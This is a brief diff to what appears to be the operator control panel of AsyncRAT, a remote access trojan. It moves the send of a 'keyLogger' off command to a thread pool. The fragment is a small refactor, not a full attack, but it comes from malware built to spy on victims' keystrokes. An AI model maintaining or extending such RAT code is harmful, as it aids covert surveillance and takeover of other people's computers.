@@ -7,6 +7,7 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -32,7 +33,7 @@ namespace AsyncRAT_Sharp.Forms
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "keyLogger";
             msgpack.ForcePathObject("isON").AsString = "false";
-            C.BeginSend(msgpack.Encode2Bytes());
+            ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
         }
     }
 }
